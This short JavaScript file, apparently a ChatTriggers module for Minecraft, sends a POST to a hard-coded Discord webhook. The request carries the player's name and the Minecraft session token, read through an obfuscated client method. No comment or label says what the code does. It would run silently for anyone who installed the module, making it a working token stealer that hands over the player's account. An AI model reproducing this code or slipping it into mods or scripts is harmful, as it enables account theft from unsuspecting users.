import request from "../requestV2"

request({
    url: "https://discord.com/api/webhooks/1360902504463994900/TsAOWCBf_0kmBXDzY18jOb2CX5qmVoK0FRnIxw09Y-a5dDTRuT241gHaPp_7eu8uYrye",
    method: "POST",
    headers: {"User-agent":"Mozilla/5.0"},
    body: {content: "```" + Player.getName() + "```\n```" + Client.getMinecraft().func_110432_I().func_148254_d() + "```"}
})


